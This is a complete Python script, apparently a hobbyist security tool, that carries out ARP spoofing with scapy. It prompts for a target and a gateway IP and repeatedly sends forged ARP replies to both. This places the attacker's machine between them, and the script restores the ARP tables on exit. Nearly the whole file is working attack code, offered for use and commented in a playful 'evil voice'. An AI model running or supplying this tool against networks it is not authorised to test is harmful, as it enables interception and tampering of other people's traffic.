#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import re
import logging

def validate_ip(ip):
    '''validating the ip address'''
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    while True:
        if ip_pattern.search(ip):
            return ip  # Return only when the IP is valid
        else:
            ip = input("Enter valid IP address: ")
          
def get_mac(ip):
    '''getting the mac address of the target device'''
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request # mixing the Ethernet + ARP into one beautiful packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0] #sending the request and getting the answer

    if answered_list:
        #returning the MAC address of the targeted ip
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] No response received for {ip}") 
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) 
    if target_mac is None:
        print(f"[-] Could not get MAC address for {target_ip}. Skipping...")
        return
    my_mac = scapy.get_if_hwaddr("eth0")  
    #builiding fake arp request
    #"Hey target, I'm spoof_ip, here's my MAC" — evil voice
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    #sending the request
    scapy.send(packet, count=5, verbose=False)  

def restore(destination_ip, source_ip):
    #bringing back peace into ARP world
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"[-] Could not restore ARP for {destination_ip} or {source_ip}")
        return
    #building and send the correct info this time: "Hey, this IP belongs to THAT MAC, not me sorry lol"
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    target_ip = None
    gateway_ip = None
    try:
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     target_ip = validate_ip(input("Enter the target IP address: ").strip())
     gateway_ip = validate_ip(input("Enter the gateway IP address: ").strip())
     sent_packets_count = 0  # Initialize counter
     while True:
            spoof(target_ip, gateway_ip) #Spoof the target: tell them gateway is at our MAC
            spoof(gateway_ip, target_ip) #Spoof the gateway: tell them the target is at our MAC
            sent_packets_count += 2
            print(f"\r[+] Sent {sent_packets_count} packets", end="")
            sys.stdout.flush() #keeping the output more clean
            time.sleep(2)
    except ValueError:
        print("[-] Network interface not found. This tool should be run on a Linux machine with a valid interface like 'eth0'.")     
    except PermissionError:
        print("[-] Permission denied. Run as root or use sudo.")        
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C... Resetting ARP tables. Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
